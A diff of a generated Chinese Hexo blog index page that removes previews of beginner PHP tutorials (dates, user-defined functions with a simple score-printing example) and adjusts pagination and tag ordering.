-<h4 id="二、查看结果"><a href="#二、查看结果" class="headerlink" title="二、查看结果"></a>二、查看结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E6%97%A5%E6%9C%9F/1-2.png" alt="1-2"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">PHP语法</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/17/PHP语法（六）—日期/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-PHP语法（五）—自定义函数" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/16/PHP语法（五）—自定义函数/">PHP语法（五） — 自定义函数</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/16/PHP语法（五）—自定义函数/" class="archive-article-date">
-  	<time datetime="2019-02-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>自定义函数以“function”开头：</p>
-<p>function functionName){<br>    被执行的代码；<br>}<br>如果需要函数返回值，使用return语句($value改成你要使用的变量）<br>例：<br>function functionName(){<br>    被执行的代码；<br>    return $value;<br>}<br>可以通过答数向的数传递信息，参数类似变量。参数被定义在函数名之后，括号内部。多参故，只要用适号隔开即可</p>
-<hr>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、自定义函数"><a href="#一、自定义函数" class="headerlink" title="一、自定义函数"></a>一、自定义函数</h3><h4 id="1-1-输入代码"><a href="#1-1-输入代码" class="headerlink" title="1.1 输入代码"></a>1.1 输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//创建一个名为Student的函数，两个参数分别为name,achievement</span><br><span class="line">function Student($name,$achievement)&#123;</span><br><span class="line">    if ($achievement &gt;= 80)&#123;</span><br><span class="line">        echo $name.&quot;考了&quot;.$achievement.&quot;分，可以过个好年了！！！&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $name.&quot;考了&quot;.$achievement.&quot;分，不知道回家会不会挨打啊！！！&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student(&quot;小敏&quot;,80);</span><br><span class="line">Student(&quot;小娟&quot;,50);</span><br><span class="line">Student(&quot;小杨&quot;,75);</span><br><span class="line">Student(&quot;小明&quot;,99);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0/1-1.png" alt="1-1"></p>
-<h4 id="1-2-查看返回结果"><a href="#1-2-查看返回结果" class="headerlink" title="1.2 查看返回结果"></a>1.2 查看返回结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0/1-2.png" alt="1-2"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">PHP语法</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/16/PHP语法（五）—自定义函数/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2018/08/01/Kali系统—工具安装和系统调整/">展开全文 >></a>
         </p>
       
 
@@ -949,7 +1337,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/3/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/Knlvre.github-io/page/5/">5</a><a class="page-number" href="/Knlvre.github-io/page/6/">6</a><a class="page-number" href="/Knlvre.github-io/page/7/">7</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/5/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/3/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><span class="page-number current">4</span>
     </nav>
   
 
@@ -1040,11 +1428,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1057,10 +1445,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Mysql数据库</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">PHP语法</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1081,6 +1465,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">基础知识点</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">PHP语法</a>
               </li>
             
             <div class="clearfix"></div>
